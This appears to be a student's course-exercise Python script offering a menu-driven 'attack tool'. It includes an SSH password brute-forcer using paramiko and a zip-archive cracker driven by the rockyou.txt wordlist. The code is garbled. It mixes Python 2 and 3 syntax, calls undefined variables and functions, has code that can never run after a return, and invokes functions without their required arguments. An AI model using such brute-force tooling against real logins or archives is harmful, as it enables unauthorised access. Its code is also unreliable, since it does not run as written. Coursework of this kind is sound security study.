# Python Script
# Ops401 - Challenge 16 - 10-27-21
# Marcus Miles

# Importing Specific Libraries
import time, getpass
import paramiko, sys, os, socket
import zipfile
###### FUNCTION 1 ######
def offensive ():
    filepath = input("Enter your filepath:\n")
    print(filepath)
    # Opening the file and encoding
    file = open(filepath, encoding = "ISO-8859-1")
    line = file.readline()
    # While loop to set delay
    while line:
        line = line.rstrip()
        word = line
        print(word)
        time.sleep(1)
        line = file.readline()
    file.close()
    # Printing the var
    print(line)
#######################

###### FUNCTION 2 ######
def defensive ():
   string = input("Please enter a string: ")
   wordfpath = input("Please enter a word list filepath: ")
   file = open(wordfpath, encoding = "ISO-8859-1")
   line = file.readline()
   while line:
      line = line.rstrip()
      string = line
      print(string)
      line = file.readline()
   file.close()
   print(string)
########################

###### FUNCTION 3 ######
def sshtool (password, code = 0):
  ssh = paramiko.SSHClient()
  ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
  # Trying an SSH connection
  try:
      ssh.connect(host, port=22, username=username1, password=wow)
  except paramiko.AuthenticationException:
      code = 1
  except socket.error, e:
      code = 2
  ssh.close()
  return code 
  # Opening the attack file
  attack_file = open(attack_file)
  print **
  # Going through all contents of the attack file to find the correct password
  for i in attack_file.readlines():
      password = i.strip('\n')
      try:
          # Trying to connect using the SSH protocol and the respectable passwords in the file
          response = ssh_connect(password)
          if response == 0:
              print("%s[*] User: %s [*] Pass Found: %s%s" % (line, username, password, line))
              sys.exit(0)
          elif response == 1:
             print("[*] User: %s [*] Pass: %s => Login Incorrect <=" % (username, password))
          elif response == 2:
              print("[*] Connection could not be established: %s" % (host))
              sys.exit(2)
      except Exception, e:
          print e
          pass
  attack_file.close()
########################

###### FUNCTION 4 ######
def crackzip(password_list, obj):
    # tracking line no. at which password is found
    idx = 0
  
    # open file in read byte mode only as "rockyou.txt"
    # file contains some special characters and hence
    # UnicodeDecodeError will be generated
    with open(password_list, 'rb') as file:
        for line in file:
            for word in line.split():
                try:
                    idx += 1
                    obj.extractall(pwd=word)
                    print("Password found at line", idx)
                    print("Password is", word.decode())
                    return True
                except:
                    continue
    return False
  
  
password_list = "rockyou.txt"
 
zip_file = "custom.zip"
  
# ZipFile object initialised
obj = zipfile.ZipFile(zip_file)
  
# count of number of words present in file
cnt = len(list(open(password_list, "rb")))
  
print("There are total", cnt,
      "number of passwords to test")
  
if crack_password(password_list, obj) == False:
    print("Password not found in this file")

########################

###### MENU ######
menu = input("""
Attack Tool Menu
1 - Offensive, Dictionary Iterator
2 - Defensive, Password Recognized
3 - Exit
4 - Brute Force Tool
5 - Brute Force Zip
    Please enter a number:
""")
if (menu == "1"):
    offensive()
elif (menu == "2"):
    defensive()
elif (menu == "3"):
    print ("Type CTRL + C")
elif (menu == "4"):
    sshtool()
elif (menu == "5"):
    crackzip()
else:
    print ("Type something Else")
##################

# End
